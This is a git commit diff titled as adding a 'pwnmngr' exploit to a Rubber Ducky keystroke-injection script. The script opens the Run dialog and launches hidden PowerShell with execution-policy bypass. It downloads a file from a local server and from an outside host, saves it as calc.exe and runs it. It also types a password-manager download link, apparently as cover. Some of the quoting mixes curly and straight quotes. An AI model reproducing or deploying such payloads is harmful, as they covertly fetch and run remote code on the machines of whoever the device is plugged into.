c143487b0797f320cb9efdb6c150376fd91e2c7b
Dominik Feger <dk.feger@gmail.com>
2022-08-27 17:57:08 +0200

    adds pwnmngr & hbrs exploit

--- scripts/DUCKY/pwmngr.sh
+++ scripts/DUCKY/pwmngr.sh
@@ -1,7 +1,7 @@
 DELAY 3000 
 GUI r 
 DELAY 200 
-STRING powershell -NoP -NonI -W Hidden -Exec Bypass “IEX (New-Object System.Net.WebClient).DownloadFile(‘http://192.168.1.96:8000/vault.swftx’,\”$env:temp\vault.swftx\”); Start-Process \”$env:temp\calc.exe\”” 
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile(‘http://192.168.1.96:8000/vault.swftx',\"$env:temp\vault.swftx\"); Start-Process \"$env:temp\calc.exe\"" 
 ENTER
 
 REM Obfuscate the command prompt
@@ -19,3 +19,10 @@ DELAY 50
 BACKSPACE
 DELAY 100
 STRING https://getswifty.pro/download/win/
+
+
+DELAY 3000 
+GUI r 
+DELAY 200 
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile(‘http://darren.kitchen/calc.txt’,\"$env:temp\calc.exe\"); Start-Process \"$env:temp\calc.exe\"" 
+ENTER
